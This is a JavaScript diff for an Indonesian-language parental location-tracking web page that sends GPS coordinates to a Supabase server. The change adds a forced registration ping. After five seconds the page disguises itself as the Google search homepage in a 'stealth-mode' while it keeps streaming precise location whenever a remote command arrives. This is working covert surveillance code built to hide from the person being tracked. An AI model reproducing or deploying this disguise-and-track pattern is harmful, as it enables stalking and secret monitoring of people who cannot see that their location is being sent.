@@ -123,14 +123,36 @@ async function startActivation() {
     return;
   }
   
-  // Ubah UI menjadi Standby
+  // Ubah UI menjadi status mendaftar
   document.getElementById('startBtn').style.display = 'none';
   document.getElementById('statsBox').classList.remove('hidden');
-  document.getElementById('statStatus').textContent = 'STANDBY';
+  document.getElementById('statStatus').textContent = 'MENDAFTAR';
   document.getElementById('statusBox').className = 'status info';
-  document.getElementById('statusBox').textContent = 'Terhubung ke server. Menunggu pantauan ortu...';
+  document.getElementById('statusBox').textContent = '📍 Mendaftarkan perangkat ke server...';
   
-  // 1. BUAT KONEKSI KE SERVER SUPABASE (BROADCAST)
+  // 1. KIRIM 1 LOKASI PERTAMA SECARA PAKSA (Ping Pendaftaran)
+  navigator.geolocation.getCurrentPosition(
+    async (pos) => {
+      await sendLocation(pos.coords);
+      // Jika berhasil kirim titik pertama, masuk ke mode menunggu (Standby)
+      masukModeStandby(); 
+    },
+    (err) => {
+      document.getElementById('statusBox').className = 'status err';
+      document.getElementById('statusBox').textContent = '❌ Akses GPS Gagal / Ditolak';
+      document.getElementById('startBtn').style.display = 'block';
+    },
+    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+  );
+}
+
+function masukModeStandby() {
+  // Ubah status UI
+  document.getElementById('statStatus').textContent = 'STANDBY';
+  document.getElementById('statusBox').className = 'status ok';
+  document.getElementById('statusBox').textContent = '✅ Terdaftar! Menunggu pantauan ortu...';
+
+  // 2. BUAT KONEKSI KE SERVER SUPABASE (BROADCAST)
   channel = sbClient.channel('koneksi-' + currentName);
   
   channel.on('broadcast', { event: 'perintah-ortu' }, (msg) => {
@@ -142,30 +164,25 @@ async function startActivation() {
       }
   }).subscribe((status) => {
       if (status === 'SUBSCRIBED') {
+          // Kirim pancingan kalau-kalau ortu sudah standby di halaman map
           channel.send({ type: 'broadcast', event: 'ping-anak', payload: {} });
       }
   });
 
-  // 2. SEMBUNYIKAN APLIKASI (Ubah ke tampilan halaman utama Google)
+  // 3. SEMBUNYIKAN APLIKASI SETELAH 5 DETIK
   setTimeout(() => {
-    // Ganti class body untuk menghapus background gradasi
     document.body.className = 'stealth-mode'; 
-    document.title = 'Google'; // Ganti nama tab atas browser
+    document.title = 'Google'; 
     
-    // Ganti seluruh isi HTML dengan desain kolom pencarian Google
     document.body.innerHTML = `
       <div style="display:flex; flex-direction:column; align-items:center; justify-content:center; height:100vh; width:100%; font-family: Arial, sans-serif;">
         <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_160x56dp.png" alt="Google" style="width: 272px; margin-bottom: 25px;">
         
         <div style="display:flex; align-items:center; border: 1px solid #dfe1e5; border-radius: 24px; padding: 10px 20px; width: 90%; max-width: 584px; box-shadow: 0 1px 6px rgba(32,33,36,.28);">
-          <!-- Ikon Kaca Pembesar -->
           <svg focusable="false" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" style="width:20px; color:#9aa0a6; margin-right:12px;">
             <path d="M15.5 14h-.79l-.28-.27A6.471 6.471 0 0 0 16 9.5 6.5 6.5 0 1 0 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z" fill="#9aa0a6"></path>
           </svg>
-          
           <input type="text" style="border:none; outline:none; flex-grow:1; font-size:16px;" placeholder="Telusuri Google atau ketik URL">
-          
-          <!-- Ikon Mic -->
           <svg focusable="false" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" style="width:20px; margin-left:12px;">
             <path fill="#4285f4" d="m12 15c1.66 0 3-1.31 3-2.97v-7.02c0-1.66-1.34-3.01-3-3.01s-3 1.34-3 3.01v7.02c0 1.66 1.34 2.97 3 2.97z"></path>
             <path fill="#34a853" d="m11 18.08h2v3.92h-2z"></path>
@@ -178,11 +195,11 @@ async function startActivation() {
   }, 5000);
 }
 
-// FUNGSI NYALAKAN GPS (Hanya dipanggil dari perintah Ortu)
+// FUNGSI NYALAKAN GPS (Hanya dipanggil saat ada sinyal MULAI dari Ortu)
 function startGPS() {
   if (watchId) return; 
   
-  console.log("Ortu sedang memantau, menyalakan GPS!");
+  console.log("Ortu sedang memantau, menyalakan GPS realtime!");
   watchId = navigator.geolocation.watchPosition(
     async (pos) => {
       await sendLocation(pos.coords);
@@ -194,7 +211,7 @@ function startGPS() {
   );
 }
 
-// FUNGSI MATIKAN GPS (Hanya dipanggil dari perintah Ortu)
+// FUNGSI MATIKAN GPS (Hanya dipanggil saat ada sinyal BERHENTI dari Ortu)
 function stopGPS() {
   if (watchId) {
     navigator.geolocation.clearWatch(watchId);
@@ -214,7 +231,7 @@ async function sendLocation(coords) {
     if (error) throw error;
     
     sentCount++;
-    // Memperbarui UI hanya jika elemen HTML stat box masih ada sebelum disembunyikan
+    // Memperbarui UI stat hanya jika masih belum masuk mode penyamaran
     if(document.getElementById('statSent')) {
       document.getElementById('statSent').textContent = sentCount;
       document.getElementById('statAcc').textContent = Math.round(coords.accuracy) + 'm';
